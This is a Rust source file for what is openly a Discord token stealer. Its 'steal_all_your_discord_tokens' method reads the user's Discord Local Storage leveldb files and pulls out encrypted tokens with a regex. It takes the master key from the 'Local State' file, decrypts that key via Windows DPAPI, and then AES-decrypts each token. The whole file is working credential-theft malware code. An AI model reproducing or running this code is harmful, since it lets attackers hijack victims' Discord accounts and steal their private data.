use std::io::Error;
use std::fs;

use regex::Regex;

use base64::{alphabet, Engine};
use base64::engine::general_purpose;

use crate::modules::decrypt::{decrypt_dpapi, decrypt_aes};
pub struct Discarder {
    discord_path: String,
    base64_engine: general_purpose::GeneralPurpose
}

impl Discarder {
    pub fn new() -> Discarder {
        let user = whoami::username();
        
        let discord_path = 
            String::from("C:/Users/").to_owned() + 
            &user +
            "/AppData/Roaming/discord";

        let config = general_purpose::GeneralPurposeConfig::new();

        let engine = general_purpose::GeneralPurpose::new(&alphabet::STANDARD, config);
        
        Discarder { 
            discord_path,
            base64_engine: engine
        }
    }

    pub fn steal_all_your_discord_tokens(&self) -> Result<Vec<String>, Error> {            
        let path = self.discord_path.clone() + "/Local Storage/leveldb";

        let directory = fs::read_dir(path.clone())?;

        let mut result: Vec<String> = Vec::new();

        for file in directory.into_iter() {
            let file = match file {
                Ok(x) => x,
                Err(_) => continue
            };
    
            // convert filename to string
            let filename = file.file_name();
    
            let filename = filename.to_str().expect("invalid file name");
    
            // skip this file if its type isnt .ldb
            if !filename.ends_with(".ldb") {continue}
    
            // get the file's path
            let path = path.clone() + "/" + filename;
    
            // decrypt the token in the file
            let token = self.decrypt_token_from_file(&path);

            match token {
                Some(token) => result.push(token),
                _ => {} // do nothing
            };
    
        }

        Ok(result)
    }
    
    fn decrypt_token_from_file(&self, path: &str) -> Option<String> {
        // read file
        let file = fs::read(path).unwrap();
    
        let mut contents = String::from("");
    
        for item in file {
            contents += &(item as char).to_string();
        }
    
        // construct regex
        let re = Regex::new(r#"dQw4w9WgXcQ:[^"]*="#).unwrap();

        // get the match
        let mat = match re.find(&contents) {
            Some(x) => x,
            None => return None
        };
    
        // get string from match, and remove rickroll prefix
        let base64_token = contents[mat.start() + 12..mat.end()].to_owned();
    
        // decode to base64
        let encrypted_token = self.base64_engine.decode(base64_token).unwrap();

        // get encryption key
        let key = self.get_encryption_key();

        // decrypt with key
        let decrypted = decrypt_aes::decrypt(&encrypted_token, &key);
    
        // convert into String
        let mut token = String::new();

        for item in decrypted {
            token += &(item as char).to_string();
        }

        Some(token)
    }
    
    fn get_encryption_key(&self) -> Vec<u8> {
        // read the Local State file
        let file = fs::read_to_string(self.discord_path.clone() + "/Local State").unwrap();

        // get the key
        let file = &file[30..file.len() - 3];

        let mut key = self.base64_engine.decode(file).unwrap();

        // remove DPAPI prefix
        key.rotate_left(5);
        key.truncate(key.len() - 5);
        
        // decrypt key
        let decoded = decrypt_dpapi::decrypt(&mut key).expect("Key decryption failed");

        return decoded;
    }
}